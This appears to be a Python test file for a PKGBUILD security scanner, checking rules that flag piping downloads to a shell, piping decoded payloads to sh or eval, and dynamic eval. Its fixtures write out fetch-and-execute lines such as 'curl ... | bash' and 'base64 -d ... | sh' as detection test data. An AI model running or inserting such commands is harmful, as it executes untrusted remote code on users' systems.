"""Per-rule tests for R01-R03."""

from __future__ import annotations

from aurscan.models import Severity
from tests.rules_utils import by_rule, run_rules


def test_r01_pipe_to_shell_direct_wrapper_and_process_substitution() -> None:
    source = """\
build() {
  curl -s https://example.invalid/a.sh | bash
  wget -qO- https://example.invalid/b.sh | sudo sh
  bash <(curl -s https://example.invalid/c.sh)
}
"""
    findings = by_rule(run_rules(source), "R01")

    assert len(findings) == 3
    assert all(finding.severity == Severity.HIGH for finding in findings)
    assert all(finding.file == "PKGBUILD" for finding in findings)


def test_r01_ignores_downloads_not_executed() -> None:
    source = """\
build() {
  curl -o payload.tar.gz https://example.invalid/payload.tar.gz
  wget https://example.invalid/file
}
"""
    assert by_rule(run_rules(source), "R01") == []


def test_r02_decoding_pipe_is_high() -> None:
    source = """\
build() {
  base64 -d payload.b64 | sh
  xxd -r payload.hex | bash
  openssl enc -d -aes-256-cbc -in payload.enc | sh
  base64 -d payload.b64 > decoded.bin
}
"""
    findings = by_rule(run_rules(source), "R02")

    assert len(findings) == 3
    assert all(finding.severity == Severity.HIGH for finding in findings)


def test_r02_decoding_pipe_to_eval_is_high() -> None:
    source = """\
build() {
  base64 -d payload.b64 | eval
}
"""
    findings = by_rule(run_rules(source), "R02")

    assert len(findings) == 1
    assert findings[0].severity == Severity.HIGH


def test_r03_dynamic_eval_is_medium() -> None:
    source = """\
build() {
  eval "$cmd"
  exec "$(printf ls)"
  eval "make"
}
"""
    findings = by_rule(run_rules(source), "R03")

    assert len(findings) == 2
    assert all(finding.severity == Severity.MEDIUM for finding in findings)


def test_r03_literal_eval_is_not_reported() -> None:
    assert by_rule(run_rules('build() {\n  eval "make"\n}\n'), "R03") == []
